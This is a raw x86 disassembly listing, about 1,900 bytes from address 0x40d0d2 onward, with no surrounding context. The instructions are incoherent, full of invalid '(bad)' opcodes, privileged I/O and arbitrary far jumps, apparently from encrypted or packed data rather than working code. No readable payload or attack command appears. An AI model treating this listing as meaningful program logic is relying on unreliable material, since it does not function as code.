  40d0d2:	fiadd  WORD PTR [ebp-0x48]
  40d0d5:	fidiv  DWORD PTR [edx]
  40d0d7:	cld    
  40d0d8:	sbb    ch,BYTE PTR [edi]
  40d0da:	leave  
  40d0db:	push   edi
  40d0dc:	add    esp,DWORD PTR ds:0xf089318e
  40d0e2:	fstp   QWORD PTR [edi+0x185540a8]
  40d0e8:	xchg   edi,eax
  40d0e9:	imul   ebx,DWORD PTR [edx-0x51],0x77
  40d0ed:	mov    al,0x8
  40d0ef:	mov    edi,0x86127cf8
  40d0f4:	push   es
  40d0f5:	rcr    BYTE PTR [eax],0xbb
  40d0f8:	mov    bl,0xab
  40d0fa:	and    eax,0xe92a4fd2
  40d0ff:	ins    DWORD PTR es:[edi],dx
  40d100:	mov    esi,0x28ff70fa
  40d105:	fmul   QWORD PTR es:[esi+0x59]
  40d10a:	loopne 0x40d0f9
  40d10c:	jno    0x40d162
  40d10e:	pop    ecx
  40d10f:	(bad)
  40d112:	fistp  DWORD PTR ss:[esi+eiz*4+0x1241fcb6]
  40d11a:	or     bh,BYTE PTR [ebp-0x42]
  40d11d:	push   esi
  40d11e:	xor    BYTE PTR [edx],dh
  40d120:	sar    DWORD PTR [ecx],1
  40d122:	cmp    esp,0xf58e7008
  40d128:	cmp    BYTE PTR [eax+0x12f2748b],bl
  40d12e:	int3   
  40d12f:	aas    
  40d130:	adc    esp,DWORD PTR [eax-0x2b]
  40d133:	pop    eax
  40d134:	sub    eax,0x51f0abcf
  40d139:	push   esp
  40d13a:	cmp    DWORD PTR [edx],ecx
  40d13c:	dec    ebp
  40d13d:	cwde   
  40d13e:	or     al,0x24
  40d140:	push   ebp
  40d141:	jo     0x40d0da
  40d143:	enter  0x81f5,0xe6
  40d147:	mov    dl,0xb2
  40d149:	mov    edi,0x329e83cb
  40d14e:	pop    edx
  40d14f:	dec    ebx
  40d150:	xchg   edi,eax
  40d151:	repz cmp bh,BYTE PTR [edx+ebp*1-0x3177ba68]
  40d159:	jl     0x40d1a5
  40d15b:	clc    
  40d15c:	xchg   esp,eax
  40d15d:	shl    dh,1
  40d15f:	cmp    ecx,esp
  40d161:	and    BYTE PTR [ecx],dl
  40d163:	xchg   ecx,eax
  40d164:	mov    al,ds:0x1b5d4557
  40d169:	inc    ebx
  40d16a:	hlt    
  40d16b:	push   cs
  40d16c:	add    DWORD PTR [esi],0x4e
  40d16f:	mov    ch,0x73
  40d171:	push   cs
  40d172:	sti    
  40d173:	pop    edi
  40d174:	scas   al,BYTE PTR es:[edi]
  40d175:	lds    ecx,FWORD PTR [ebx+ebp*8]
  40d178:	jmp    0x40d19d
  40d17a:	dec    ebx
  40d17b:	rol    BYTE PTR [ecx],1
  40d17d:	pop    ecx
  40d17e:	mov    WORD PTR [esp+esi*1+0x3f],gs
  40d182:	inc    ebp
  40d183:	push   ebp
  40d184:	sbb    ch,dl
  40d186:	mov    ds:0x94cdea03,al
  40d18b:	cmp    al,0xa8
  40d18d:	sub    DWORD PTR [edi+0x2c],eax
  40d190:	jl     0x40d11a
  40d192:	les    ecx,FWORD PTR [eax-0x1a]
  40d195:	nop
  40d196:	scas   al,BYTE PTR es:[edi]
  40d197:	push   0x49fb259f
  40d19c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d19d:	inc    ecx
  40d19e:	lods   eax,DWORD PTR ds:[esi]
  40d19f:	arpl   WORD PTR [edx+0x3dbbd7e8],cx
  40d1a5:	jge    0x40d1de
  40d1a7:	and    al,0xdc
  40d1a9:	test   BYTE PTR [ecx-0x55268f5d],al
  40d1af:	scas   eax,DWORD PTR es:[edi]
  40d1b0:	xor    cl,ch
  40d1b2:	bound  edi,QWORD PTR [ecx-0x2e]
  40d1b5:	push   es
  40d1b6:	sub    ecx,DWORD PTR [edi+edx*8-0x4e]
  40d1ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d1bb:	cld    
  40d1bc:	cli    
  40d1bd:	pop    edi
  40d1be:	push   eax
  40d1bf:	shr    DWORD PTR [ecx+0x5e353faa],1
  40d1c5:	aad    0xb9
  40d1c7:	mov    edx,0xb3aafce5
  40d1cc:	popa   
  40d1cd:	inc    ebx
  40d1ce:	pop    ecx
  40d1cf:	popf   
  40d1d0:	stc    
  40d1d1:	add    dh,BYTE PTR [ebp-0x563fddab]
  40d1d7:	sbb    al,0x92
  40d1d9:	int3   
  40d1da:	fcomp  QWORD PTR [esp+eax*1-0x1]
  40d1de:	in     al,0xec
  40d1e0:	lock mov eax,ds:0x59682168
  40d1e6:	dec    esi
  40d1e7:	pop    edi
  40d1e8:	mov    BYTE PTR [edx+ebp*4-0x64ac95f4],0xe7
  40d1f0:	mov    bl,bh
  40d1f2:	mov    eax,0x19c18624
  40d1f7:	stos   BYTE PTR es:[edi],al
  40d1f8:	repnz in al,0x13
  40d1fb:	mov    esi,0xb54c30e7
  40d200:	popf   
  40d201:	mov    al,ds:0x29faca19
  40d206:	pusha  
  40d207:	and    al,0xb0
  40d209:	aad    0xd0
  40d20b:	popf   
  40d20c:	or     esp,DWORD PTR [eax+ecx*4-0x1b444f5e]
  40d213:	sub    ch,BYTE PTR [edx+0x59e6f108]
  40d219:	or     BYTE PTR [eax+0x799052d0],ah
  40d21f:	mov    ah,0xe2
  40d221:	cmp    esi,esi
  40d223:	cmp    edi,DWORD PTR [eax]
  40d225:	and    dh,BYTE PTR [ecx-0xd31b99]
  40d22b:	das    
  40d22c:	lds    esi,FWORD PTR [edi+0x752e8888]
  40d232:	pop    esi
  40d233:	mov    ebx,DWORD PTR [eax]
  40d235:	and    al,0xa5
  40d237:	xchg   edi,ebx
  40d239:	pop    eax
  40d23a:	cs jmp 0x19c8:0xfed5ee59
  40d242:	inc    esi
  40d243:	or     eax,0xa170e45
  40d248:	(bad)  
  40d249:	and    eax,0x95189d48
  40d24e:	add    bh,BYTE PTR [ecx+0x12]
  40d251:	test   DWORD PTR [eax+0x1f],edi
  40d254:	xchg   ebp,eax
  40d255:	jo     0x40d200
  40d257:	fcom   QWORD PTR [esi]
  40d259:	test   esp,esp
  40d25b:	or     BYTE PTR [eax-0x38],0x9c
  40d25f:	pop    ds
  40d260:	icebp  
  40d261:	enter  0x7780,0x33
  40d265:	inc    esp
  40d266:	jbe    0x40d20c
  40d268:	xchg   ecx,eax
  40d269:	arpl   dx,di
  40d26b:	shl    DWORD PTR [esi],0xf9
  40d26e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d26f:	dec    ebp
  40d270:	fwait
  40d271:	mov    al,0xad
  40d273:	mov    esi,0xfc59aa1e
  40d278:	adc    eax,0xf770dcc
  40d27d:	and    eax,0xee3442c6
  40d282:	or     BYTE PTR ds:0x845ef6d5,al
  40d288:	mov    ecx,0x650027b6
  40d28d:	hlt    
  40d28e:	adc    BYTE PTR [eax],cl
  40d290:	mov    edx,0xe5e9649f
  40d295:	ins    BYTE PTR es:[edi],dx
  40d296:	mov    cl,0x6
  40d298:	jle    0x40d24c
  40d29a:	lahf   
  40d29b:	fistp  WORD PTR [edi-0x31cec06f]
  40d2a1:	mov    bh,bh
  40d2a3:	or     eax,0x32533d0d
  40d2a8:	pop    ss
  40d2a9:	xor    BYTE PTR [esi+ebp*1-0x4f168703],al
  40d2b0:	dec    esi
  40d2b1:	ret    
  40d2b2:	rol    DWORD PTR [ecx],cl
  40d2b4:	stos   BYTE PTR es:[edi],al
  40d2b5:	pop    ss
  40d2b6:	or     DWORD PTR ds:0xec69ea4,edx
  40d2bc:	imul   edi,DWORD PTR [ecx],0xaf3f3265
  40d2c2:	xchg   ecx,eax
  40d2c3:	sbb    ebx,0xf299ee21
  40d2c9:	into   
  40d2ca:	mov    WORD PTR [eax],fs
  40d2cc:	jmp    0xed186195
  40d2d1:	stos   BYTE PTR es:[edi],al
  40d2d2:	dec    esi
  40d2d3:	mov    DWORD PTR [ecx+0x6c],ebx
  40d2d6:	add    ebx,DWORD PTR [edx-0x68400861]
  40d2dc:	jp     0x40d29f
  40d2de:	leave  
  40d2df:	ret    0xa51b
  40d2e2:	jbe    0x40d311
  40d2e4:	mov    al,ds:0x6cc8be79
  40d2e9:	jg     0x40d305
  40d2eb:	push   ss
  40d2ec:	push   esi
  40d2ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d2ee:	adc    BYTE PTR [edi],0x51
  40d2f1:	jp     0x40d2fb
  40d2f3:	pushf  
  40d2f4:	call   0x70debd25
  40d2f9:	test   al,0xd
  40d2fb:	jb     0x40d30c
  40d2fd:	test   BYTE PTR [eax-0x51376c68],0x72
  40d304:	jno    0x40d375
  40d306:	sbb    eax,0x95d3b3dc
  40d30b:	push   ds
  40d30c:	jno    0x40d328
  40d30e:	fs cmp ebp,ecx
  40d311:	(bad)  
  40d312:	neg    DWORD PTR [eax-0x6]
  40d315:	and    eax,0x3fec119a
  40d31a:	cli    
  40d31b:	ins    DWORD PTR es:[edi],dx
  40d31c:	adc    bh,BYTE PTR [eax+eax*8+0x23]
  40d320:	mov    ebx,0x44176784
  40d325:	lds    edi,FWORD PTR [edx]
  40d327:	push   esi
  40d328:	mov    ah,0xca
  40d32a:	inc    ebp
  40d32b:	fdivr  DWORD PTR [ecx-0x74]
  40d32e:	iret   
  40d32f:	stos   DWORD PTR es:[edi],eax
  40d330:	hlt    
  40d331:	push   eax
  40d332:	jnp    0x40d32d
  40d334:	pusha  
  40d335:	sar    DWORD PTR [ebx+0x3b0b2bbf],0x79
  40d33c:	bound  edx,QWORD PTR [eax+0x365ebeb8]
  40d342:	fdivr  DWORD PTR [esi+0x2f]
  40d345:	jle    0x40d3c1
  40d347:	iret   
  40d348:	(bad)  
  40d349:	out    dx,al
  40d34a:	mov    WORD PTR [esp+edx*1-0x52],ss
  40d34e:	sub    dh,BYTE PTR [edi-0x7fa42ed1]
  40d354:	add    DWORD PTR [ebp-0x68dfc628],esp
  40d35a:	jne    0x40d39f
  40d35c:	jns    0x40d36a
  40d35e:	pushf  
  40d35f:	cwde   
  40d360:	bound  esp,QWORD PTR [ebx]
  40d362:	mov    DWORD PTR [ebp+0x348b2752],esp
  40d368:	das    
  40d369:	mov    bl,ch
  40d36b:	inc    esi
  40d36c:	pop    eax
  40d36d:	or     DWORD PTR [edi+0x1d],ebp
  40d370:	(bad)  
  40d372:	jecxz  0x40d343
  40d374:	mov    WORD PTR [ecx],?
  40d376:	sti    
  40d377:	test   BYTE PTR [ecx+0x538259f6],bh
  40d37d:	outs   dx,BYTE PTR ds:[esi]
  40d37e:	test   eax,0x4317f66
  40d383:	inc    ebx
  40d384:	mov    DWORD PTR [edx],eax
  40d386:	shr    BYTE PTR [esi+eiz*4],1
  40d389:	dec    esi
  40d38a:	mov    al,ds:0xb884f23d
  40d38f:	add    cl,ch
  40d391:	mov    ch,0x58
  40d393:	loope  0x40d3dc
  40d395:	jecxz  0x40d35a
  40d397:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d398:	ret    
  40d399:	xchg   dh,bh
  40d39b:	sbb    al,0x9
  40d39d:	adc    ah,cl
  40d39f:	mov    ds,WORD PTR [eax-0x643baabc]
  40d3a5:	mov    es,WORD PTR [ebp+0x5b59e5ee]
  40d3ab:	imul   esi,DWORD PTR ds:0x5f3a4205,0x67
  40d3b2:	mov    esi,0x9d749f57
  40d3b7:	mov    ds:0x5705829f,al
  40d3bc:	pop    ds
  40d3bd:	cmpxchg DWORD PTR [ecx-0x78bfffc7],edx
  40d3c4:	aaa    
  40d3c5:	xchg   edi,eax
  40d3c6:	scas   al,BYTE PTR es:[edi]
  40d3c7:	sbb    ebp,DWORD PTR [edx-0x5dc35b29]
  40d3cd:	scas   eax,DWORD PTR es:[edi]
  40d3ce:	or     eax,0x8b56959e
  40d3d3:	repnz push ebx
  40d3d5:	mov    esi,0x772309c4
  40d3da:	adc    al,0xd6
  40d3dc:	jns    0x40d36e
  40d3de:	mov    ebx,0xc12dbf66
  40d3e3:	lods   al,BYTE PTR ds:[esi]
  40d3e4:	xchg   esi,eax
  40d3e5:	aam    0x6c
  40d3e7:	sub    cl,cl
  40d3e9:	shl    BYTE PTR [ecx-0x3e],1
  40d3ec:	dec    edi
  40d3ed:	pop    eax
  40d3ee:	pop    esp
  40d3ef:	cdq    
  40d3f0:	iret   
  40d3f1:	xor    al,0xd5
  40d3f3:	and    eax,0xf46a80dc
  40d3f8:	pop    edx
  40d3f9:	mov    eax,ds:0x4a536341
  40d3fe:	pushf  
  40d3ff:	inc    esi
  40d400:	jmp    0xa3b7:0x66a74966
  40d407:	mov    dh,0x2d
  40d409:	jo     0x40d3fd
  40d40b:	inc    eax
  40d40c:	dec    eax
  40d40d:	js     0x40d3af
  40d40f:	xor    BYTE PTR [ebp-0x6f24a7f2],ah
  40d415:	aad    0xa1
  40d417:	push   cs
  40d418:	lods   eax,DWORD PTR ds:[esi]
  40d419:	(bad)  
  40d41a:	jae    0x40d448
  40d41c:	outs   dx,BYTE PTR ds:[esi]
  40d41d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d41e:	xchg   ebx,eax
  40d41f:	ds push edx
  40d421:	int3   
  40d422:	xlat   BYTE PTR ds:[ebx]
  40d423:	punpckhbw mm0,QWORD PTR [ecx-0x4f38c25d]
  40d42a:	lods   eax,DWORD PTR ds:[esi]
  40d42b:	mov    bl,0xef
  40d42d:	in     al,0x15
  40d42f:	jge    0x40d484
  40d431:	ret    
  40d432:	call   0xd249:0x6ec3fe08
  40d439:	(bad)  
  40d43a:	and    bh,BYTE PTR [edi+ebp*2]
  40d43d:	int    0x0
  40d43f:	cmp    BYTE PTR [esi+0x39e60371],0xc8
  40d446:	and    al,0x26
  40d448:	fstp   DWORD PTR [ebx+0xf0760e1]
  40d44e:	push   edx
  40d44f:	mov    DWORD PTR [ebx+0x29ee5661],eax
  40d455:	stc    
  40d456:	sbb    eax,0x4cf5e774
  40d45b:	retf   0xf456
  40d45e:	mov    al,0xbb
  40d460:	dec    edx
  40d461:	jne    0x40d475
  40d463:	test   DWORD PTR [ecx],ecx
  40d465:	jo     0x40d3fd
  40d467:	aam    0x94
  40d469:	(bad)  [edx]
  40d46b:	jne    0x40d417
  40d46d:	rol    bl,1
  40d46f:	mov    al,ds:0x12f9137
  40d474:	jb     0x40d4e1
  40d476:	nop
  40d477:	xchg   ebx,eax
  40d478:	and    ah,cl
  40d47a:	in     eax,dx
  40d47b:	imul   esp,DWORD PTR ds:0xeb942e86,0x51
  40d482:	add    BYTE PTR [esi+0x7d],ah
  40d485:	test   DWORD PTR [ecx+0x5e],0x569433fa
  40d48c:	outs   dx,DWORD PTR ds:[esi]
  40d48d:	popa   
  40d48e:	(bad)  [edi-0x45f111bd]
  40d494:	outs   dx,DWORD PTR ds:[esi]
  40d495:	loopne 0x40d419
  40d497:	lahf   
  40d498:	in     al,dx
  40d499:	in     eax,dx
  40d49a:	les    edi,FWORD PTR [esi+0x19dbc95a]
  40d4a0:	mov    ds:0x4fba84b1,eax
  40d4a5:	xor    eax,0x21c10b3d
  40d4aa:	ins    BYTE PTR es:[edi],dx
  40d4ab:	je     0x40d520
  40d4ad:	jne    0x40d46f
  40d4af:	cmp    esi,ebx
  40d4b1:	jle    0x40d446
  40d4b3:	mov    esi,0x2ce557a7
  40d4b8:	fcomp  DWORD PTR [ebp-0x4c44e227]
  40d4be:	iret   
  40d4bf:	push   0xffffffa1
  40d4c1:	xor    ebp,edx
  40d4c3:	sbb    bl,BYTE PTR [eax+ebp*2]
  40d4c6:	in     eax,0x64
  40d4c8:	inc    ebx
  40d4c9:	sar    BYTE PTR [edi],cl
  40d4cb:	in     al,0x1c
  40d4cd:	shl    DWORD PTR [ebx],1
  40d4cf:	test   eax,0x8c2a8fb7
  40d4d4:	sbb    eax,0x40edeaae
  40d4d9:	into   
  40d4da:	mov    cs,edx
  40d4dc:	xchg   dl,cl
  40d4de:	inc    edx
  40d4df:	push   0xed4cc75c
  40d4e4:	stos   DWORD PTR es:[edi],eax
  40d4e5:	add    al,0xe2
  40d4e7:	ja     0x40d53d
  40d4e9:	mov    edx,0x8e346517
  40d4ee:	push   ebx
  40d4ef:	dec    edx
  40d4f0:	or     bh,dl
  40d4f2:	in     al,dx
  40d4f3:	jle    0x40d51b
  40d4f5:	pop    es
  40d4f6:	cmp    eax,DWORD PTR [ebx+ebp*1-0x55]
  40d4fa:	lods   al,BYTE PTR ds:[esi]
  40d4fb:	mov    eax,0xd3450dd3
  40d500:	pushf  
  40d501:	outs   dx,BYTE PTR ds:[esi]
  40d502:	(bad)  
  40d503:	jmp    0x40d57d
  40d505:	push   esp
  40d506:	or     DWORD PTR [esi-0x47],edx
  40d509:	lods   eax,DWORD PTR ds:[esi]
  40d50a:	repnz shr DWORD PTR [edi],1
  40d50d:	jae    0x40d505
  40d50f:	lahf   
  40d510:	out    dx,al
  40d511:	gs jbe 0x40d570
  40d514:	repz daa 
  40d516:	sti    
  40d517:	xor    al,0x8f
  40d519:	loope  0x40d4e2
  40d51b:	hlt    
  40d51c:	retf   
  40d51d:	retf   
  40d51e:	and    BYTE PTR [ecx+0x19],al
  40d521:	jl     0x40d4ae
  40d523:	add    al,0xeb
  40d525:	or     ecx,DWORD PTR [edi-0x2e]
  40d528:	or     BYTE PTR [esi+0x3fc4f9ec],dl
  40d52e:	and    ebx,edx
  40d530:	add    ecx,0xffffffe7
  40d533:	mov    WORD PTR ss:0x1c05a1f0,fs
  40d53a:	push   0x6d
  40d53c:	cmp    edi,DWORD PTR [ebx]
  40d53e:	js     0x40d58e
  40d540:	fidiv  WORD PTR [esi+0x294e3024]
  40d546:	mov    ds:0xde284e03,al
  40d54b:	mov    WORD PTR [ebp-0x4019f040],es
  40d551:	jg     0x40d5c1
  40d553:	dec    esp
  40d554:	inc    esp
  40d555:	ins    BYTE PTR es:[edi],dx
  40d556:	in     eax,dx
  40d557:	or     eax,DWORD PTR [esi]
  40d559:	stc    
  40d55a:	std    
  40d55b:	test   eax,0x4c8b3011
  40d560:	out    0xa7,eax
  40d562:	in     al,dx
  40d563:	(bad)  
  40d564:	data16 stc 
  40d566:	xchg   ebp,eax
  40d567:	test   al,0x9
  40d569:	or     al,dh
  40d56b:	push   ss
  40d56c:	dec    ecx
  40d56d:	repnz push cs
  40d56f:	test   DWORD PTR [esi],ecx
  40d571:	adc    eax,0x7bfdc1e5
  40d576:	mov    ah,0x91
  40d578:	xchg   BYTE PTR [ecx-0x721cc369],bh
  40d57e:	mov    ds,WORD PTR [ebx]
  40d580:	mov    ecx,0x2f2d4009
  40d585:	push   0xc97e0d0a
  40d58a:	scas   eax,DWORD PTR es:[edi]
  40d58b:	adc    eax,0x92de1295
  40d590:	push   ds
  40d591:	mov    ecx,0x90df4e50
  40d596:	xor    ch,dl
  40d598:	or     esp,DWORD PTR [ebx]
  40d59a:	fisttp QWORD PTR [ecx+0x63783f40]
  40d5a0:	cli    
  40d5a1:	pop    ebx
  40d5a2:	in     al,0xbb
  40d5a4:	stc    
  40d5a5:	gs pop edx
  40d5a7:	lds    esp,FWORD PTR [esi+0x44]
  40d5aa:	sub    DWORD PTR [ebx+0x1e],ecx
  40d5ad:	and    al,0xfa
  40d5af:	nop
  40d5b0:	adc    BYTE PTR [edi],0xf
  40d5b3:	sbb    esi,eax
  40d5b5:	cmp    esi,DWORD PTR ds:[ecx-0x37]
  40d5b9:	mov    esp,0x46b3c57a
  40d5be:	xor    al,0x6a
  40d5c0:	and    eax,0x415adbe5
  40d5c5:	xchg   ecx,eax
  40d5c6:	and    dh,BYTE PTR [ecx+0x79720b4e]
  40d5cc:	cmp    BYTE PTR [ebx+ecx*1],dh
  40d5cf:	xor    al,0x23
  40d5d1:	jl     0x40d5a4
  40d5d3:	in     al,dx
  40d5d4:	jbe    0x40d5f1
  40d5d6:	adc    bh,ch
  40d5d8:	fidivr DWORD PTR [eax+0x22]
  40d5db:	ds je  0x40d63b
  40d5de:	push   edx
  40d5df:	out    0xe9,al
  40d5e1:	or     eax,0x6f65aa61
  40d5e6:	fdivr  QWORD PTR [eax+0x31]
  40d5e9:	sub    BYTE PTR [ebp+0x63],dl
  40d5ec:	add    ebp,esp
  40d5ee:	inc    eax
  40d5ef:	adc    esi,DWORD PTR [esi+0x68a43b1c]
  40d5f5:	imul   ebp,ebp,0x150cb80d
  40d5fb:	push   ds
  40d5fc:	inc    ebp
  40d5fd:	pop    ds
  40d5fe:	inc    ebx
  40d5ff:	les    ebp,FWORD PTR [ecx]
  40d601:	arpl   dx,si
  40d603:	or     al,0x4a
  40d605:	push   es
  40d606:	mov    ebx,0x48069608
  40d60b:	stos   BYTE PTR es:[edi],al
  40d60c:	mov    cl,0x62
  40d60e:	mov    ds:0x3ad45c1b,eax
  40d613:	iret   
  40d614:	or     DWORD PTR [ecx],edi
  40d616:	mov    eax,0x47c71714
  40d61b:	push   cs
  40d61c:	or     ebp,eax
  40d61e:	popa   
  40d61f:	jle    0x40d5dc
  40d621:	inc    ebx
  40d622:	in     al,0xe8
  40d624:	pushf  
  40d625:	xor    eax,0xd5e29bdc
  40d62a:	gs out dx,eax
  40d62c:	mov    edi,0xe2c1f834
  40d631:	fdivp  st(3),st
  40d633:	in     al,0x21
  40d635:	int    0x75
  40d637:	inc    edx
  40d638:	and    DWORD PTR [esi-0x16ab12bd],eax
  40d63e:	enter  0xd638,0xd5
  40d642:	retf   
  40d643:	ret    
  40d644:	mov    WORD PTR [esi+0x2377393f],cs
  40d64a:	je     0x40d626
  40d64c:	idiv   BYTE PTR [eax]
  40d64e:	dec    ebp
  40d64f:	or     edi,esi
  40d651:	sbb    BYTE PTR [esi-0x61],dh
  40d654:	(bad)  
  40d656:	sub    DWORD PTR [ecx-0x260ca949],edx
  40d65c:	loope  0x40d61e
  40d65e:	sub    DWORD PTR [ebx+0x1ee42715],edi
  40d664:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d665:	pop    esp
  40d666:	push   edx
  40d667:	adc    DWORD PTR [edi],0xffffffba
  40d66a:	pop    ecx
  40d66b:	mov    bh,0x75
  40d66d:	stos   DWORD PTR es:[edi],eax
  40d66e:	(bad)  
  40d66f:	pop    ebp
  40d670:	mov    esi,DWORD PTR [esi]
  40d672:	add    al,0xc9
  40d674:	lds    edi,FWORD PTR [esi]
  40d676:	jo     0x40d6e7
  40d678:	mov    ds:0x3f3e24b3,eax
  40d67d:	and    eax,0x3bdaa897
  40d682:	push   esp
  40d683:	bound  edi,QWORD PTR [eax+eax*4+0x7d5a57d7]
  40d68a:	inc    edx
  40d68b:	cmp    BYTE PTR [edi+0x2b],al
  40d68e:	std    
  40d68f:	mov    eax,ds:0xe0764a78
  40d694:	cdq    
  40d695:	lods   eax,DWORD PTR ds:[esi]
  40d696:	lahf   
  40d697:	cwde   
  40d698:	mov    ch,0xe0
  40d69a:	fadd   QWORD PTR [edi]
  40d69c:	and    esi,0x18e26440
  40d6a2:	xchg   esp,eax
  40d6a3:	push   edx
  40d6a4:	shl    ebp,1
  40d6a6:	test   DWORD PTR [ebx+0x21],edx
  40d6a9:	and    eax,0x622929a4
  40d6ae:	mov    esi,edx
  40d6b0:	sar    BYTE PTR [edi+0x38],cl
  40d6b3:	sub    BYTE PTR [edi+0x4c],0xa7
  40d6b7:	dec    eax
  40d6b8:	cwde   
  40d6b9:	not    DWORD PTR [ebp-0x4158ed60]
  40d6bf:	imul   DWORD PTR [eax-0x28]
  40d6c2:	cdq    
  40d6c3:	push   ebp
  40d6c4:	scas   eax,DWORD PTR es:[edi]
  40d6c5:	out    dx,al
  40d6c6:	and    ebx,DWORD PTR [ebp-0xf1b3532]
  40d6cc:	shr    BYTE PTR [edi-0x6c91b304],0xa
  40d6d3:	sbb    al,0xc1
  40d6d5:	test   DWORD PTR [ecx],ebx
  40d6d7:	adc    BYTE PTR [esi-0x5f],dl
  40d6da:	push   ecx
  40d6db:	push   ebp
  40d6dc:	mov    esp,DWORD PTR [ecx+0x31]
  40d6df:	pop    es
  40d6e0:	ss jge 0x40d6eb
  40d6e3:	pop    ebp
  40d6e4:	dec    edx
  40d6e5:	jae    0x40d6f7
  40d6e7:	pop    ds
  40d6e8:	inc    ebx
  40d6e9:	add    al,0x7
  40d6eb:	fadd   DWORD PTR [ebp+ebp*8-0x52b9fd15]
  40d6f2:	loope  0x40d698
  40d6f4:	mov    esi,DWORD PTR [esi-0x3f45db7]
  40d6fa:	jl     0x40d6ed
  40d6fc:	rcl    BYTE PTR [eax-0x49597822],1
  40d702:	sub    dh,0xba
  40d705:	sub    cl,BYTE PTR [eax]
  40d707:	pop    ds
  40d708:	das    
  40d709:	ds stos DWORD PTR es:[edi],eax
  40d70b:	sar    esi,cl
  40d70d:	loope  0x40d73e
  40d70f:	xchg   ecx,eax
  40d710:	push   ds
  40d711:	lock sar BYTE PTR [ecx-0x44],0xf
  40d716:	jp     0x40d77c
  40d718:	xor    al,0xe5
  40d71a:	daa    
  40d71b:	xchg   BYTE PTR [eax+0x5c],ah
  40d71e:	push   0xffffff9d
  40d720:	aam    0xf8
  40d722:	xlat   BYTE PTR ds:[ebx]
  40d723:	ins    DWORD PTR es:[edi],dx
  40d724:	stc    
  40d725:	mov    ebp,0x67c7981c
  40d72a:	lock fsubr DWORD PTR [edx+0x66]
  40d72e:	push   es
  40d72f:	cmp    al,0x54
  40d731:	lods   al,BYTE PTR ds:[esi]
  40d732:	pop    esp
  40d733:	push   cs
  40d734:	jo     0x40d751
  40d736:	sbb    DWORD PTR [edi-0x38],edi
  40d739:	push   ebp
  40d73a:	pop    ecx
  40d73b:	pop    ss
  40d73c:	and    al,0x75
  40d73e:	sbb    eax,0xa065f9d8
  40d743:	dec    esi
  40d744:	daa    
  40d745:	sahf   
  40d746:	in     al,dx
  40d747:	lods   eax,DWORD PTR ds:[esi]
  40d748:	xchg   edx,eax
  40d749:	inc    eax
  40d74a:	push   eax
  40d74b:	popa   
  40d74c:	lds    esp,FWORD PTR [eax+0x52bef41c]
  40d752:	mov    al,0xfc
  40d754:	stc    
  40d755:	pop    esi
  40d756:	push   ds
  40d757:	dec    edi
  40d758:	fst    QWORD PTR [esi]
  40d75a:	test   DWORD PTR [edx+0x53],edi
  40d75d:	retf   0xfa3b
  40d760:	mov    edi,0x7e19a4e0
  40d765:	ret    0xf93c
  40d768:	add    BYTE PTR [ebp-0x7b],0x89
  40d76c:	fidivr WORD PTR [ecx]
  40d76e:	mov    ah,0x94
  40d770:	fs jg  0x40d7e3
  40d773:	mov    al,ds:0xa56d7124
  40d778:	add    bh,dl
  40d77a:	ds cli 
  40d77c:	mov    edi,0xfdcb87e1
  40d781:	pop    edx
  40d782:	hlt    
  40d783:	(bad)  
  40d785:	push   cs
  40d786:	call   0x6be8:0x239eabdf
  40d78d:	add    dl,cl
  40d78f:	mov    gs,WORD PTR [edx]
  40d791:	ret    0x2bc6
  40d794:	(bad)  
  40d795:	ret    0x293
  40d798:	dec    esp
  40d799:	add    esi,DWORD PTR [esi-0x6362cc84]
  40d79f:	cmp    DWORD PTR [edi],ebp
  40d7a1:	and    al,0x16
  40d7a3:	ss xchg ecx,eax
  40d7a5:	call   0x394396e5
  40d7aa:	pop    ds
  40d7ab:	inc    edx
  40d7ac:	sbb    eax,0xffffffe2
  40d7af:	sbb    DWORD PTR [ebx+edx*4-0x29f12551],ebp
  40d7b6:	lock dec esp
  40d7b8:	out    dx,al
  40d7b9:	xor    dh,BYTE PTR [esi+0x770e037c]
  40d7bf:	arpl   WORD PTR [ecx+esi*4+0x53],sp
  40d7c3:	or     eax,0xd6e36900
  40d7c8:	or     BYTE PTR [eax],ch
  40d7ca:	sub    BYTE PTR [ebx-0x76],al
  40d7cd:	sbb    DWORD PTR [edi],0xffffff85
  40d7d0:	mov    ds:0x79a21b62,al
  40d7d5:	mov    dl,0x69
  40d7d7:	adc    ch,BYTE PTR [esi+0x67]
  40d7da:	(bad)  
  40d7db:	xor    al,0xcf
  40d7dd:	mov    ch,0x4d
  40d7df:	sub    DWORD PTR [edi-0x439fe09c],0xa7900ba4
  40d7e9:	test   DWORD PTR ds:[ebx-0x32],edx
  40d7ed:	call   0x6f4e:0x39cbdf4d
  40d7f4:	repz mov ch,0xd8
  40d7f7:	clc    
  40d7f8:	popa   
  40d7f9:	popf   
  40d7fa:	in     eax,dx
  40d7fb:	jnp    0x40d7f8
  40d7fd:	sti    
  40d7fe:	loop   0x40d809
  40d800:	push   0xfffffff0
  40d802:	fsubr  DWORD PTR [eax+0x430d6a37]
  40d808:	daa    
  40d809:	lds    ebx,FWORD PTR [edx+0x1e]
  40d80c:	push   es
  40d80d:	sti    
  40d80e:	test   ebp,esi
  40d810:	xchg   BYTE PTR [ebx],dh
  40d812:	fs repz inc ecx
  40d815:	adc    BYTE PTR [edx-0x1],dl
  40d818:	fldenv [esi+0x4e]
  40d81b:	(bad)  
  40d81c:	fadd   DWORD PTR [edi]
  40d81e:	or     DWORD PTR [ebp+0x4f09b125],edi
  40d824:	lahf   
  40d825:	jge    0x40d7fc
  40d827:	mov    ebx,0xdff538dd
  40d82c:	adc    DWORD PTR [ebx-0x45647bff],0x621dc820
  40d836:	out    0x8f,eax
  40d838:	cwde   
  40d839:	add    eax,0x317f1d95
  40d83e:	retf   0x71c1
  40d841:	(bad)  
  40d842:	in     eax,dx
  40d843:	sub    eax,0xdb324eaa
  40d848:	and    BYTE PTR [ecx+0x39],ah
  40d84b:	mov    esi,0x6f85fc96
  40d850:	adc    esp,DWORD PTR [eax]
  40d852:	sti    
  40d853:	(bad)  
  40d854:	out    0x19,eax
  40d856:	jbe    0x40d8a4
  40d858:	sbb    BYTE PTR [edx+0x61],dh
  40d85b:	inc    ebx
  40d85c:	test   edx,ebp
  40d85e:	cwde   
